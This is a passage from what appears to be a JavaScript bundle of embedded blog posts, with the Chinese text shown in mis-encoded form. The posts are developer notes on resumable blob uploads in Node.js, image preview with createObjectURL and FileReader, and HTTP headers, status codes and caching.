href=\\"https://gist.github.com/stonehank/5d3dea234ac6bc200bdef9c181c0a645\\">ä»£ç ä½ç½®</a></p>\\n<hr>\\n<p>è¦ç‚¹ï¼š</p>\\n<ol>\\n<li><p>é€šè¿‡<code>blob.slice()</code>å¯¹æ–‡ä»¶è¿›è¡Œåˆ†å‰²ï¼Œå†é€ä¸ªä¸Šä¼ </p>\\n<p> <code>blob.slice(start, end, blob.type)</code></p>\\n</li>\\n<li><p>æœªä½¿ç”¨è¡¨å•ï¼Œè€Œæ˜¯é€šè¿‡<code>FormData</code>(æ–¹ä¾¿å¤„ç†äºŒè¿›åˆ¶)å’Œ<code>xhr</code>å‘é€</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>   <span class=\\"hljs-keyword\\">let</span> fd = <span class=\\"hljs-keyword\\">new</span> FormData()\\n   fd.append(<span class=\\"hljs-string\\">\'name\'</span>, blob.name)\\n   fd.append(<span class=\\"hljs-string\\">\'start\'</span>, start)\\n   fd.append(<span class=\\"hljs-string\\">\'fragments\'</span>, cur);\\n   xhr.open(<span class=\\"hljs-string\\">\'POST\'</span>, <span class=\\"hljs-string\\">\'http://localhost:8080/upload.js\'</span>, <span class=\\"hljs-literal\\">true</span>);\\n   xhr.send(fd)</code></pre></code></pre>\\n</li>\\n<li><p>ä½¿ç”¨äº†<code>multiparty</code>ï¼Œå¯ä»¥è§£æ<code>FormData</code></p>\\n</li>\\n<li><p>é€šè¿‡ä¼ é€’startå€¼å’Œ<code>fs.createWriteStream</code>å¯¹ç»­ä¼ æ–‡ä»¶è¿›è¡Œä¿®æ”¹</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> <span class=\\"hljs-comment\\">// r+ è¡¨ç¤ºä¿®æ”¹è€Œä¸æ˜¯é‡å†™ï¼Œr+ä¸ä¼šè‡ªåŠ¨åˆ›å»ºä¸å­˜åœ¨çš„æ–‡ä»¶</span>\\n writable=fs.createWriteStream(curFileName,{<span class=\\"hljs-attr\\">flags</span>:<span class=\\"hljs-string\\">\'r+\'</span>,<span class=\\"hljs-attr\\">start</span>:+start})\\n writable.write(content)</code></pre></code></pre>\\n<p> åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨(åŒæ­¥)ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> <span class=\\"hljs-keyword\\">try</span> {\\n   fs.accessSync(curFileName);\\n } <span class=\\"hljs-keyword\\">catch</span> (err) {\\n   writable=fs.createWriteStream(curFileName)\\n }  </code></pre></code></pre>\\n</li>\\n</ol>\\n<p>é‡åˆ°çš„ä¸€äº›é—®é¢˜ï¼š</p>\\n<ol>\\n<li><p>phpä½¿ç”¨ç¯å¢ƒ(æœ¬åœ°æµ‹è¯•éœ€è¦æ¶è®¾è™šæ‹ŸæœåŠ¡å™¨)</p>\\n</li>\\n<li><p>xhrå¯¹äºŒè¿›åˆ¶æ•°æ®ä¸èƒ½ä¼ é€’é”®å€¼å¯¹(ä»…èƒ½ä¼ å•ä¸ªäºŒè¿›åˆ¶æ•°æ®)</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> <span class=\\"hljs-keyword\\">let</span> blob=<span class=\\"hljs-keyword\\">new</span> Blob([someContent])\\n\\n xhr.send(blob)  \\n <span class=\\"hljs-comment\\">// åå°ç›´æ¥å†™å…¥æ–‡ä»¶ä¾¿å¯ï¼Œæ— é¡»è½¬æ¢</span>\\n\\n xhr.send(<span class=\\"hljs-string\\">`name=<span class=\\"hljs-subst\\">${blob.name}</span>&amp;content=<span class=\\"hljs-subst\\">${blob}</span>`</span>)\\n <span class=\\"hljs-comment\\">// è¿™ä¹ˆä¼ åå°å°±æ— æ³•è§£æcontentï¼Œå§‹ç»ˆæ˜¯ä¸ª[object Object]</span></code></pre></code></pre>\\n</li>\\n<li><p>é€šè¿‡FormDataä¼ é€’ï¼Œæœ‰åˆ†éš”ç¬¦<code>-----</code>å’Œä¸€äº›ç¼–ç ï¼Œä½¿ç”¨<code>querystring</code>æ— æ³•è§£æï¼Œä½†ä½¿ç”¨php\\nä½œä¸ºåç«¯å¥½åƒä¸å­˜åœ¨å…¼å®¹é—®é¢˜ã€‚</p>\\n</li>\\n<li><p><code>multiparty</code>å½“è§£æå‡½æ•°ä½¿ç”¨äº†<code>cb</code>åˆ™æ— æ³•ç›‘å¬å®ƒçš„<code>part</code>äº‹ä»¶ï¼Œå› ä¸ºå…¨éƒ¨è¯´æ˜å†…å®¹éƒ½ä»¥é”®å€¼å¯¹å½¢å¼ä¼ é€’åˆ°<code>cb</code>é‡Œé¢äº†\\nï¼Œä½†æ˜¯å…·ä½“æ•°æ®å†…å®¹å¿…é¡»ç”¨<code>part</code>ç›‘å¬æ‰èƒ½è·å–ï¼Œæ•°æ®è·å–æ–¹æ³•å’Œ<code>res.on(&#39;data&#39;)</code>&amp;&amp;<code>res.on(&#39;end&#39;)</code>ç±»ä¼¼</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> <span class=\\"hljs-keyword\\">let</span> form=<span class=\\"hljs-keyword\\">new</span> Multiparty.Form()\\n\\n <span class=\\"hljs-comment\\">// æƒ…å†µ1ï¼šæ•°æ®æµå…¥æ­¤å¤„ï¼Œä¸ä¼šå†è§¦å‘åº•ä¸‹çš„ç›‘å¬äº‹ä»¶</span>\\n form.parse(req,<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">err, fields, files</span>)</span>{   \\n    <span class=\\"hljs-comment\\">/* ... */</span>   \\n });\\n\\n <span class=\\"hljs-comment\\">// æƒ…å†µ2ï¼šæ•°æ®æµå…¥ç›‘å¬äº‹ä»¶</span>\\n form.parse(req)\\n\\n form.on(<span class=\\"hljs-string\\">\'part\'</span>, <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">part</span>) </span>{\\n      part.on(<span class=\\"hljs-string\\">\'data\'</span>, <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">chunk</span>)</span>{   \\n        <span class=\\"hljs-comment\\">/* æƒ…å†µ2ä¸‹ï¼Œè¿™é‡Œçš„chunkå°±æ˜¯ä¼ å…¥çš„åˆ†æ®µæ•°æ® */</span>\\n      })\\n      part.on(<span class=\\"hljs-string\\">\'end\'</span>, <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n        <span class=\\"hljs-comment\\">/* ... */</span>\\n      })\\n })</code></pre></code></pre>\\n</li>\\n<li><p>xhrå®šä¹‰<code>responseType=&#39;json&#39;</code>ï¼Œä¼šè‡ªåŠ¨å°†ç¬¦åˆæ ¼å¼çš„å›åº”å€¼è½¬æ¢æˆjsonï¼Œ\\nä½†ä¸èƒ½ä½¿ç”¨<code>responseText</code>æ¥æ”¶ï¼Œä½¿ç”¨<code>response</code>è¯»å–json</p>\\n<p>å¦å¤–è¿˜æœ‰<code>responseXML</code>è¯»å–document</p>\\n</li>\\n</ol>\\n","toc":[{"anchor":"yi-ge-ke-zan-ting-fen-duan-shang-chuan-de-li-zi","level":2,"text":"ä¸€ä¸ªå¯æš‚åœåˆ†æ®µä¸Šä¼ çš„ä¾‹å­"}],"relatedTags":null,"created_at":"2018-07-26","timeArr":[2018,6,26,0,0,0,0],"title":"é€šè¿‡blobå®ç°æ–‡ä»¶ç»­ä¼ è®°å½•(nodejs)","uuid":"46e9b0a650dba0fd4351e6b9b36a76775bb0bc76","summary":"<h4>ä¸€ä¸ªå¯æš‚åœåˆ†æ®µä¸Šä¼ çš„ä¾‹å­</h4>\\n<p><a href=\\"https://gist.github.com/stonehank/5d3dea234ac6bc200bdef9c181c0a645\\">ä»£ç ä½ç½®</a></p>","slug":"tong-guo-blob-shi-xian-wen-jian-xu-chuan-ji-lu-(nodejs)","sha":"f3a86b01ae6164f031e648596d9eeafb87fb28f6"}')},645:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"jie-xi-blob-shi-xian-tu-pian-yu-lan\\">è§£æblobå®ç°å›¾ç‰‡é¢„è§ˆ</h2>\\n<p>åŸç†å¾ˆç®€å•ï¼Œ<code>blob</code>æ˜¯ä¸€ä¸ªå‚¨å­˜äº†äºŒè¿›åˆ¶çš„å¤§å¯¹è±¡ï¼Œè€Œ<code>createObjectURL</code>å¯ä»¥è§£æblobæˆä¸ºä¸€ä¸ªurlæ ¼å¼ï¼Œ\\nå†ç”¨<code>img</code>æ ‡ç­¾æ¸²æŸ“å³å¯ã€‚</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>  <span class=\\"hljs-keyword\\">if</span>(blob.type.indexOf(<span class=\\"hljs-string\\">\'image\'</span>)!==<span class=\\"hljs-number\\">-1</span>){\\n    newURL=<span class=\\"hljs-built_in\\">window</span>.URL.createObjectURL(blob)\\n    <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-literal\\">true</span>\\n  }<span class=\\"hljs-keyword\\">else</span>{\\n    alert(<span class=\\"hljs-string\\">\\"é€‰æ‹©å›¾ç‰‡\\"</span>)\\n    <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-literal\\">false</span></code></pre></code></pre>\\n<p>æ³¨æ„ï¼š<code>input type=file</code>æ ‡ç­¾çš„å±æ€§fileså°±æ˜¯blobå¯¹è±¡çš„é›†åˆï¼Œä¸éœ€è¦å†å¦å¤–åˆ›å»ºblobå¯¹è±¡ã€‚</p>\\n<p>å¦å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨<code>FileReader</code>å¯¹blobè¿›è¡Œè§£æï¼Œå…¶ä¸­ä¹ŸåŒ…æ‹¬è§£ææˆurlæ ¼å¼</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> fr=<span class=\\"hljs-keyword\\">new</span> FileReader()\\n  <span class=\\"hljs-keyword\\">if</span>(blob.type.indexOf(<span class=\\"hljs-string\\">\'image\'</span>)!==<span class=\\"hljs-number\\">-1</span>){\\n    fr.readAsDataURL(blob);\\n    <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-literal\\">true</span>\\n  }<span class=\\"hljs-keyword\\">else</span>{\\n    alert(<span class=\\"hljs-string\\">\\"é€‰æ‹©å›¾ç‰‡\\"</span>)\\n    <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-literal\\">false</span></code></pre></code></pre>\\n<p>ä½†ç”±äº<code>FileReader</code>çš„è§£æè¿‡ç¨‹ä½¿å¼‚æ­¥çš„ï¼Œå¿…é¡»åœ¨å®ƒçš„ç›‘å¬å‡½æ•°å†…è°ƒç”¨è§£æå€¼<code>result</code></p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>fr.onload=<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n  newURL=fr.result\\n  createIMG()\\n}</code></pre></code></pre>\\n<p>ä»£ç åœ°å€ï¼š<a href=\\"https://gist.github.com/stonehank/113b2164e4c7fc4bdefdab96d34ad917\\">https://gist.github.com/stonehank/113b2164e4c7fc4bdefdab96d34ad917</a></p>\\n","toc":[{"anchor":"jie-xi-blob-shi-xian-tu-pian-yu-lan","level":2,"text":"è§£æblobå®ç°å›¾ç‰‡é¢„è§ˆ"}],"relatedTags":null,"created_at":"2018-07-25","timeArr":[2018,6,25,0,0,0,0],"title":"é€šè¿‡è§£æblobå®ç°å›¾ç‰‡é¢„è§ˆ","uuid":"c210dfbee9273c04ed715f0cf70a75b648672b17","summary":"<h4>è§£æblobå®ç°å›¾ç‰‡é¢„è§ˆ</h4>\\n<p>åŸç†å¾ˆç®€å•ï¼Œ<code>blob</code>æ˜¯ä¸€ä¸ªå‚¨å­˜äº†äºŒè¿›åˆ¶çš„å¤§å¯¹è±¡ï¼Œè€Œ<code>createObjectURL</code>å¯ä»¥è§£æblobæˆä¸ºä¸€ä¸ªurlæ ¼å¼ï¼Œ\\nå†ç”¨<code>img</code>æ ‡ç­¾æ¸²æŸ“å³å¯ã€‚</p>\\n<pre class=\\"hljs\\"><code>  <span class=\\"hljs-keyword\\">if</span>(blob.type.indexOf(<span class=\\"hljs-string\\">\'image\'</span>)!==<span class=\\"hljs-number\\">-1</span>){\\n    newURL=<span class=\\"hljs-built_in\\">window</span>.U...</code></pre>","slug":"tong-guo-jie-xi-blob-shi-xian-tu-pian-yu-lan","sha":"bf946078e90730d7d626fe3573c4adad5f9cd0e2"}')},646:function(n){n.exports=JSON.parse('{"content":"<ul>\\n<li>TCP/IPåˆ†ä¸º4ä¸ªå±‚</li>\\n</ul>\\n<table>\\n<thead>\\n<tr>\\n<th align=\\"center\\">åç§°</th>\\n<th align=\\"center\\">ä»£è¡¨</th>\\n</tr>\\n</thead>\\n<tbody><tr>\\n<td align=\\"center\\">åº”ç”¨å±‚</td>\\n<td align=\\"center\\">HTTP</td>\\n</tr>\\n<tr>\\n<td align=\\"center\\">ä¼ è¾“å±‚</td>\\n<td align=\\"center\\">TCP</td>\\n</tr>\\n<tr>\\n<td align=\\"center\\">ç½‘ç»œå±‚</td>\\n<td align=\\"center\\">IP</td>\\n</tr>\\n<tr>\\n<td align=\\"center\\">é“¾è·¯å±‚</td>\\n<td align=\\"center\\"></td>\\n</tr>\\n</tbody></table>\\n<ul>\\n<li><p>HTTPåè®®</p>\\n<ul>\\n<li>ç”Ÿæˆè¯·æ±‚æäº¤(å®¢æˆ·ç«¯)</li>\\n<li>å¤„ç†è¯·æ±‚(æœåŠ¡ç«¯)</li>\\n</ul>\\n</li>\\n<li><p>DNSåè®®</p>\\n<ul>\\n<li>æ ¹æ®åŸŸåæŸ¥æ‰¾IP</li>\\n</ul>\\n</li>\\n<li><p>TCPåè®®</p>\\n<ul>\\n<li><p>åˆ†å‰²æ•°æ®</p>\\n</li>\\n<li><p>ç¡®ä¿ä¼ è¾“æˆåŠŸ(å®¢æˆ·ç«¯)</p>\\n<p>  <code>ä½¿ç”¨3æ¬¡æ¡æ‰‹</code></p>\\n</li>\\n<li><p>ç¡®ä¿æ¥å—æˆåŠŸ(æœåŠ¡ç«¯)</p>\\n</li>\\n<li><p>åˆå¹¶æ•°æ®</p>\\n</li>\\n</ul>\\n</li>\\n<li><p>IPåè®®</p>\\n<p>  ä¸­è½¬+ä¼ é€</p>\\n<ul>\\n<li>IPåœ°å€</li>\\n<li>Macåœ°å€</li>\\n<li>ARP(é€šè¿‡IPåœ°å€åæŸ¥Macåœ°å€)</li>\\n</ul>\\n</li>\\n<li><p>URIï¼šèµ„æºçš„æ ‡è¯†(http,ft,file...)</p>\\n</li>\\n<li><p>URLï¼šèµ„æºåœ°å€(http)</p>\\n</li>\\n</ul>\\n<hr>\\n<p>Httpè¯·æ±‚æ–¹æ³•ï¼š</p>\\n<ul>\\n<li>GETï¼šè·å–èµ„æº</li>\\n<li>POSTï¼šä¼ è¾“å®ä½“ä¸»ä½“</li>\\n<li>PUTï¼šä¼ è¾“æ–‡ä»¶(æ— éªŒè¯æœºåˆ¶)</li>\\n<li>HEADï¼šè·å¾—æŠ¥æ–‡é¦–éƒ¨</li>\\n<li>DELETEï¼šåˆ é™¤æ–‡ä»¶</li>\\n<li>OPTIONSï¼šè¯¢é—®æ”¯æŒçš„æ–¹æ³•</li>\\n<li>TRACEï¼šè¿½è¸ªè·¯å¾„</li>\\n<li>CONNECTï¼šè¦æ±‚ç”¨éš§é“åè®®è¿æ¥ä»£ç†</li>\\n</ul>\\n<hr>\\n<blockquote>\\n<p>å•æ¬¡è¿æ¥ï¼šæ¯ä¸ªè¯·æ±‚ä¸€æ¬¡è¿æ¥</p>\\n</blockquote>\\n<blockquote>\\n<p>æŒä¹…è¿æ¥ï¼šå¤šä¸ªè¯·æ±‚ä¸€æ¬¡è¿æ¥</p>\\n<blockquote>\\n<p>ç®¡çº¿åŒ–ï¼šå¤šä¸ªå†…å®¹ä¸€æ¬¡è¯·æ±‚</p>\\n</blockquote>\\n</blockquote>\\n<hr>\\n<p>çŠ¶æ€ç ï¼š</p>\\n<ul>\\n<li><p>206ï¼šéƒ¨åˆ†è¯·æ±‚ï¼Œæ­é…<code>Content-Range</code>ä½¿ç”¨</p>\\n</li>\\n<li><p>302ï¼šä¸´æ—¶é‡å®šå‘ï¼Œè§„åˆ™ä¸Šå®šä¹‰ä¸èƒ½æ”¹å˜<code>method</code></p>\\n</li>\\n<li><p>303ï¼šä¸´æ—¶é‡å®šå‘ï¼Œè§„åˆ™ä¸Šå®šä¹‰é‡å®šå‘ä½¿ç”¨<code>GET</code></p>\\n</li>\\n<li><p>304ï¼šå…è®¸è®¿é—®èµ„æºï¼Œä½†ä¸ç¬¦åˆæ¡ä»¶</p>\\n<p>  ä¾‹å¦‚<code>If-Modified-Since</code>ï¼ŒæœåŠ¡ç«¯å‘ç°è¯·æ±‚æä¾›çš„<code>æœ€åä¿®æ”¹æ—¥æœŸ</code>å’ŒæœåŠ¡ç«¯çš„<code>æœ€åä¿®æ”¹æ—¥æœŸ</code>ä¸€è‡´ï¼Œåˆ™è¿”å›304.</p>\\n</li>\\n<li><p>307ï¼šä¸302çš„åŒºåˆ«åœ¨äºï¼Œç¡®ä¿è¯·æ±‚æ–¹æ³•å’Œæ¶ˆæ¯ä¸»ä½“ä¸ä¼šå‘ç”Ÿå˜åŒ–</p>\\n</li>\\n</ul>\\n<hr>\\n<p>ä»£ç†ã€ç½‘å…³ã€éš§é“</p>\\n<ul>\\n<li><p>ä»£ç†ï¼šå¤„ç†åŒè¾¹çš„ä¿¡æ¯äº¤äº’ï¼Œæ¯æ¬¡é€šè¿‡ä»£ç†æœåŠ¡å™¨è½¬å‘è¯·æ±‚æˆ–å“åº”æ—¶ï¼Œä¼šè¿½åŠ å†™å…¥ Via é¦–éƒ¨ä¿¡æ¯</p>\\n</li>\\n<li><p>ç½‘å…³ï¼šç½‘å…³çš„å·¥ä½œæœºåˆ¶å’Œä»£ç†ååˆ†ç›¸ä¼¼ã€‚è€Œç½‘å…³èƒ½ä½¿é€šä¿¡çº¿è·¯ä¸Šçš„æœåŠ¡å™¨æä¾›<code>é HTTP åè®®</code>æœåŠ¡ã€‚</p>\\n</li>\\n<li><p>éš§é“ï¼šéš§é“å¯æŒ‰è¦æ±‚å»ºç«‹èµ·ä¸€æ¡ä¸å…¶ä»–æœåŠ¡å™¨çš„é€šä¿¡çº¿è·¯ï¼Œå±Šæ—¶ä½¿ç”¨ SSL ç­‰åŠ å¯†æ‰‹æ®µè¿›è¡Œé€šä¿¡ã€‚</p>\\n</li>\\n</ul>\\n<hr>\\n<p>HTTP é€šç”¨é¦–éƒ¨å­—æ®µ</p>\\n<ul>\\n<li>Cache-Control</li>\\n</ul>\\n<ol>\\n<li><p>ç¼“å­˜è¯·æ±‚æŒ‡ä»¤</p>\\n<table>\\n<thead>\\n<tr>\\n<th>æŒ‡ä»¤</th>\\n<th>å‚æ•°</th>\\n<th>è¯´æ˜</th>\\n</tr>\\n</thead>\\n<tbody><tr>\\n<td><strong>no-cache</strong></td>\\n<td>æ— </td>\\n<td>ä¸ä½¿ç”¨ç¼“å­˜çš„å†…å®¹ï¼Œå¼ºåˆ¶å‘æºæœåŠ¡å™¨å†æ¬¡éªŒè¯</td>\\n</tr>\\n<tr>\\n<td><strong>no-store</strong></td>\\n<td>æ— </td>\\n<td>ä¸ç¼“å­˜è¯·æ±‚æˆ–å“åº”çš„ä»»ä½•å†…å®¹</td>\\n</tr>\\n<tr>\\n<td>max-age = [ ç§’]</td>\\n<td>å¿…éœ€</td>\\n<td>å“åº”çš„æœ€å¤§Ageå€¼</td>\\n</tr>\\n<tr>\\n<td>max-stale( = [ ç§’])</td>\\n<td>å¯çœç•¥</td>\\n<td>æ¥æ”¶å·²è¿‡æœŸçš„å“åº”</td>\\n</tr>\\n<tr>\\n<td>min-fresh = [ ç§’]</td>\\n<td>å¿…éœ€</td>\\n<td>æœŸæœ›åœ¨æŒ‡å®šæ—¶é—´å†…çš„å“åº”ä»æœ‰æ•ˆ</td>\\n</tr>\\n<tr>\\n<td>no-transform</td>\\n<td>æ— </td>\\n<td>ä»£ç†ä¸å¯æ›´æ”¹åª’ä½“ç±»å‹</td>\\n</tr>\\n<tr>\\n<td>only-if-cached</td>\\n<td>æ— </td>\\n<td>ä»ç¼“å­˜è·å–èµ„æº</td>\\n</tr>\\n<tr>\\n<td>cache-extension</td>\\n<td>-</td>\\n<td>æ–°æŒ‡ä»¤æ ‡è®°ï¼ˆtokenï¼‰</td>\\n</tr>\\n</tbody></table>\\n</li>\\n<li><p>ç¼“å­˜å“åº”æŒ‡ä»¤</p>\\n<table>\\n<thead>\\n<tr>\\n<th>æŒ‡ä»¤</th>\\n<th>å‚æ•°</th>\\n<th>è¯´æ˜</th>\\n</tr>\\n</thead>\\n<tbody><tr>\\n<td>public</td>\\n<td>æ— </td>\\n<td>å¯å‘ä»»æ„æ–¹æä¾›å“åº”çš„ç¼“å­˜</td>\\n</tr>\\n<tr>\\n<td>private</td>\\n<td>å¯çœç•¥</td>\\n<td>ä»…å‘ç‰¹å®šç”¨æˆ·è¿”å›å“åº”</td>\\n</tr>\\n<tr>\\n<td>no-cache</td>\\n<td>å¯çœç•¥</td>\\n<td>å…è®¸ç¼“å­˜ï¼Œç¼“å­˜å‰å¿…é¡»å…ˆç¡®è®¤å…¶æœ‰æ•ˆæ€§</td>\\n</tr>\\n<tr>\\n<td>no-store</td>\\n<td>æ— </td>\\n<td>ä¸ç¼“å­˜è¯·æ±‚æˆ–å“åº”çš„ä»»ä½•å†…å®¹</td>\\n</tr>\\n<tr>\\n<td>no-transform</td>\\n<td>æ— </td>\\n<td>ä»£ç†ä¸å¯æ›´æ”¹åª’ä½“ç±»å‹</td>\\n</tr>\\n<tr>\\n<td>must-revalidate</td>\\n<td>æ— </td>\\n<td>å¿…é¡»å†å‘æºæœåŠ¡å™¨è¿›è¡Œç¡®è®¤å½“å‰ç¼“å­˜æ˜¯å¦æœ‰æ•ˆï¼Œå†ç¡®å®šæ˜¯å¦ä½¿ç”¨</td>\\n</tr>\\n<tr>\\n<td>proxy-revalidate</td>\\n<td>æ— </td>\\n<td>è¦æ±‚ä¸­é—´ç¼“å­˜æœåŠ¡å™¨å¯¹ç¼“å­˜çš„å“åº”æœ‰æ•ˆæ€§å†è¿›è¡Œç¡®è®¤</td>\\n</tr>\\n<tr>\\n<td>max-age = [ ç§’]</td>\\n<td>å¿…éœ€</td>\\n<td>å“åº”çš„æœ€å¤§Ageå€¼ï¼Œ1.1<code>max-age</code>ä¼˜å…ˆï¼Œ1.0<code>Expires</code>ä¼˜å…ˆ</td>\\n</tr>\\n<tr>\\n<td>s-maxage = [ ç§’]</td>\\n<td>å¿…éœ€</td>\\n<td>å…¬å…±ç¼“å­˜æœåŠ¡å™¨å“åº”çš„æœ€å¤§Ageå€¼</td>\\n</tr>\\n<tr>\\n<td>cache-extension</td>\\n<td>-</td>\\n<td>æ–°æŒ‡ä»¤æ ‡è®°ï¼ˆtokenï¼‰</td>\\n</tr>\\n</tbody></table>\\n</li>\\n</ol>\\n<ul>\\n<li><p>Transfer-Encoding</p>\\n<p>  è§„å®šäº†ä¼ è¾“æŠ¥æ–‡ä¸»ä½“æ—¶é‡‡ç”¨çš„ç¼–ç æ–¹å¼</p>\\n</li>\\n</ul>\\n<hr>\\n<p>HTTP è¯·æ±‚é¦–éƒ¨å­—æ®µ</p>\\n<ul>\\n<li><p>Acceptï¼šå…è®¸æ¥å—çš„æ ¼å¼</p>\\n<p>  å¯ä½¿ç”¨<code>q=</code>å®šä¹‰æƒé‡(èŒƒå›´0~1ï¼Œ3ä½å°æ•°)ï¼Œé»˜è®¤1.0ã€‚</p>\\n<p>  é¦–å…ˆè¿”å›æƒé‡å€¼æœ€é«˜çš„åª’ä½“ç±»å‹</p>\\n</li>\\n<li><p>Accept-Encodingï¼šæ”¯æŒçš„å†…å®¹ç¼–ç </p>\\n<ul>\\n<li>gzip</li>\\n<li>compress</li>\\n<li>deflate</li>\\n<li>identityï¼šä¸æ‰§è¡Œå‹ç¼©æˆ–ä¸ä¼šå˜åŒ–çš„é»˜è®¤ç¼–ç æ ¼å¼</li>\\n</ul>\\n</li>\\n<li><p>Expectï¼šå‘ŠçŸ¥æœåŠ¡å™¨ï¼ŒæœŸæœ›å‡ºç°çš„æŸç§ç‰¹å®šè¡Œä¸ºï¼Œ1.1åªå®šä¹‰äº†<code>100-continue</code></p>\\n</li>\\n<li><p>If-Modified-Sinceï¼šè¯·æ±‚å­—æ®µçš„æ—¥æœŸåå¦‚æœæœ‰æ›´æ–°ï¼Œæ‰§è¡Œè¯·æ±‚ï¼Œå¦åˆ™è¿”å›çŠ¶æ€ç  304 Not Modified çš„å“åº”</p>\\n</li>\\n<li><p>If-Matchå’ŒIf-Range(æ­é…å­—æ®µRange)ï¼š</p>\\n<p>  å¦‚æœ<code>If-Match</code>å¯¹åº”çš„<code>ETag</code>ä¸ç¬¦åˆï¼Œè¿”å›çŠ¶æ€ç <code>412 Precondition Failed</code>ï¼Œéœ€è¦å†æ¬¡è¯·æ±‚</p>\\n<p>  å¦‚æœ<code>If-Range</code>å¯¹åº”çš„<code>Etag</code>ä¸ç¬¦åˆï¼Œä¼šè¿”å›æ‰€æœ‰å†…å®¹<code>200</code>ï¼Œå¦åˆ™è¿”å›<code>Range</code>è¯·æ±‚çš„éƒ¨åˆ†å†…å®¹<code>206</code></p>\\n</li>\\n<li><p>Max-Forwardsï¼šå®šä¹‰æœ€å¤šè½¬å‘çš„æ¬¡æ•°</p>\\n</li>\\n</ul>\\n","toc":[],"relatedTags":null,"created_at":"2018-11-14","timeArr":[2018,10,14,0,0,0,0],"title":"å›¾è§£Httpå¤§çº²ç¬”è®°(1)","uuid":"cd67e255a685952b6e3ba3efb90befd0197d1fe4","summary":"<ul>\\n<li>TCP/IPåˆ†ä¸º4ä¸ªå±‚</li>\\n</ul>\\n<table>\\n<thead>\\n<tr>\\n<th style=\\"text-align:center\\">åç§°</th>\\n<th style=\\"text-align:center\\">ä»£è¡¨</th>\\n</tr>\\n</thead>\\n<tbody>\\n<tr>\\n<td style=\\"text-align:center\\">åº”ç”¨å±‚</td>\\n<td style=\\"text-align:center\\">HTTP</td>\\n</tr>\\n<tr>\\n<td style=\\"text-align:center\\">ä¼ è¾“å±‚</td>\\n<td style=\\"text-align:center\\">TCP</td>\\n</tr>\\n<tr>\\n<td style=\\"text-align:center\\">ç½‘ç»œå±‚</td>\\n<td style=\\"text-align:center\\">IP</td>\\n</tr>\\n<tr>\\n<td style=\\"text-align:center\\">é“¾è·¯å±‚</td>\\n<td style=\\"text-align:center\\"></td>\\n</tr>\\n</tbody>\\n</table>\\n<ul>\\n<li>\\n<p>HTTPåè®®</p>\\n<ul>\\n<li>ç”Ÿæˆè¯·æ±‚æäº¤(å®¢æˆ·ç«¯)</li>\\n<li>å¤„ç†è¯·æ±‚(æœåŠ¡ç«¯)</li>\\n</ul>\\n</li>\\n<li>\\n<p>DNSåè®®</p>\\n<ul>\\n<li>æ ¹æ®åŸŸåæŸ¥æ‰¾IP</li>\\n</ul>\\n</li>\\n<li>\\n<p>TCP...</p>\\n</li>\\n</ul>","slug":"tu-jie-Http-da-gang-bi-ji-(1)","sha":"a606cff58ed32d4564139956743675e9c438e11a"}')},647:function(n){n.exports=JSON.parse('{"content":"<p>å®ä½“é¦–éƒ¨å­—æ®µ</p>\\n<ul>\\n<li>Content-Encodingï¼šå®ä½“ç¼–ç æ–¹å¼(gzip, compress, deflate, identity)</li>\\n<li>Content-Locationï¼šæŠ¥æ–‡ä¸»ä½“è¿”å›èµ„æºå¯¹åº”çš„ URI(ä¸ä¸€å®šæ˜¯è¯·æ±‚URI)ã€‚</li>\\n<li>Content-Rangeï¼šåŒ¹é…éƒ¨åˆ†ã€‚</li>\\n<li>Content-Typeï¼šå®ä½“å†…å¯¹è±¡çš„åª’ä½“ç±»å‹ã€‚</li>\\n<li>Last-Modifiedï¼šæŒ‡æ˜èµ„æºæœ€ç»ˆä¿®æ”¹çš„æ—¶é—´ã€‚</li>\\n</ul>\\n<hr>\\n<p>Cookieç›¸å…³å­—æ®µ</p>\\n<table>\\n<thead>\\n<tr>\\n<th>é¦–éƒ¨å­—æ®µå</th>\\n<th>è¯´æ˜</th>\\n<th>é¦–éƒ¨ç±»å‹</th>\\n</tr>\\n</thead>\\n<tbody><tr>\\n<td>Set-Cookie</td>\\n<td>å¼€å§‹çŠ¶æ€ç®¡ç†æ‰€ä½¿ç”¨çš„Cookieä¿¡æ¯</td>\\n<td>å“åº”é¦–éƒ¨å­—æ®µ</td>\\n</tr>\\n<tr>\\n<td>Cookie</td>\\n<td>æœåŠ¡å™¨æ¥æ”¶åˆ°çš„Cookieä¿¡æ¯</td>\\n<td>è¯·æ±‚é¦–éƒ¨å­—æ®µ</td>\\n</tr>\\n</tbody></table>\\n<ul>\\n<li><p>Set-Cookie</p>\\n<p>  <code>Set-Cookie: status=enable; expires=Tue, 05 Jul 2011 07:26:31 GMT; path=/; domain=.hackr.jp;</code></p>\\n</li>\\n<li><p>Set-Cookie å­—æ®µçš„å±æ€§</p>\\n</li>\\n</ul>\\n<table>\\n<thead>\\n<tr>\\n<th>å±æ€§</th>\\n<th>è¯´æ˜</th>\\n</tr>\\n</thead>\\n<tbody><tr>\\n<td>NAME=VALUE</td>\\n<td>èµ‹äºˆ Cookie çš„åç§°å’Œå…¶å€¼ï¼ˆå¿…éœ€é¡¹ï¼‰</td>\\n</tr>\\n<tr>\\n<td>expires=DATE</td>\\n<td>Cookie 